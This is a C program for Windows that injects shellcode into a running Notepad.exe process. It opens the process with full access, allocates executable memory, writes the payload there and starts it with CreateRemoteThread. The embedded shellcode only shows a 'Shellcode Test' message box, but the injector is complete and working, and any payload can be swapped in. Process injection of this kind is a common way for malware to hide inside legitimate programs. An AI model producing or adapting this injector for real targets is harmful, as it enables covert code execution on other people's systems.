#include <stdio.h>
#include <tlhelp32.h>
#include <windows.h>

int main(int argc, char **argv) {
  // Shellcode to be injected
  unsigned char shellcode[] =
      "\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
      "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7"
      "\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
      "\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01"
      "\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50"
      "\x01\xd3\x8b\x48\x18\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01"
      "\xd6\x31\xff\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
      "\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
      "\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
      "\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
      "\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00"
      "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c"
      "\x77\x26\x07\xff\xd5\x6a\x00\xe8\x0f\x00\x00\x00\x53\x68"
      "\x65\x6c\x6c\x63\x6f\x64\x65\x20\x54\x65\x73\x74\x00\xe8"
      "\x1a\x00\x00\x00\x70\x72\x6f\x62\x20\x61\x20\x73\x68\x65"
      "\x6c\x6c\x20\x63\x6f\x64\x65\x20\x72\x75\x6e\x6e\x69\x6e"
      "\x67\x00\x6a\x00\x68\x45\x83\x56\x07\xff\xd5\x6a\x00\x68"
      "\xf0\xb5\xa2\x56\xff\xd5";

  // Initialize PROCESSENTRY32 structure
  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  // Take snapshot of running processes
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE) {
    printf("Failed to create process snapshot: %d\n", GetLastError());
    return 1;
  }

  // Find the target process
  if (!Process32First(snapshot, &pe32)) {
    printf("Process32First failed: %d\n", GetLastError());
    CloseHandle(snapshot);
    return 1;
  }

  BOOL processFound = FALSE;
  do {
    if (wcscmp(pe32.szExeFile, L"Notepad.exe") == 0) {
      processFound = TRUE;

      // Open the target process
      HANDLE hProcess =
          OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
      if (hProcess == NULL) {
        printf("Failed to open process: %d\n", GetLastError());
        break;
      }

      // Allocate memory in the target process
      LPVOID allocate_mem =
          VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      if (allocate_mem == NULL) {
        printf("Memory allocation failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        break;
      }
      printf("Memory allocated in process %d at address: 0x%p\n",
             pe32.th32ProcessID, allocate_mem);

      // Write shellcode to allocated memory
      if (!WriteProcessMemory(hProcess, allocate_mem, shellcode,
                              sizeof(shellcode), NULL)) {
        printf("Failed to write process memory: %d\n", GetLastError());
        VirtualFreeEx(hProcess, allocate_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        break;
      }

      // Execute the shellcode
      HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                          (LPTHREAD_START_ROUTINE)allocate_mem,
                                          NULL, 0, NULL);
      if (hThread == NULL) {
        printf("Failed to create remote thread: %d\n", GetLastError());
        VirtualFreeEx(hProcess, allocate_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        break;
      }

      printf("Shellcode executed in Notepad.exe (PID: %d)\n",
             pe32.th32ProcessID);

      // Wait for thread to finish
      WaitForSingleObject(hThread, INFINITE);

      // Cleanup
      CloseHandle(hThread);
      VirtualFreeEx(hProcess, allocate_mem, 0, MEM_RELEASE);
      CloseHandle(hProcess);

      break;
    }
  } while (Process32Next(snapshot, &pe32));

  if (!processFound) {
    printf("Notepad.exe not found in running processes\n");
  }

  CloseHandle(snapshot);
  return 0;
}